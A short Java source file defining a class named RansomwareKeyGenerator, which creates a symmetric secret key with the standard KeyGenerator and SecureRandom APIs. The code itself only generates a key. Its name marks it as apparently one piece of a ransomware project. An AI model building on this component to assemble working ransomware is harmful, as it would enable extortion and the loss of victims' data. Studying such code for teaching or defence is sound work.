package app.keys;

import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;

import app.exceptions.AlgorithmNotFoundException;

public class RansomwareKeyGenerator {
	public SecretKey generateKey(String chosenAlgorithm) throws AlgorithmNotFoundException {

		// Creating a KeyGenerator object
		KeyGenerator keyGen = null;

		// Creating a SecureRandom object
		SecureRandom secRandom = new SecureRandom();
		
		try {
			keyGen = KeyGenerator.getInstance(chosenAlgorithm);
		} catch (NoSuchAlgorithmException e) {
			throw new AlgorithmNotFoundException();
		}
		// Initializing the KeyGenerator
		keyGen.init(secRandom);

		// Creating/Generating a key
		return keyGen.generateKey();

	}

}
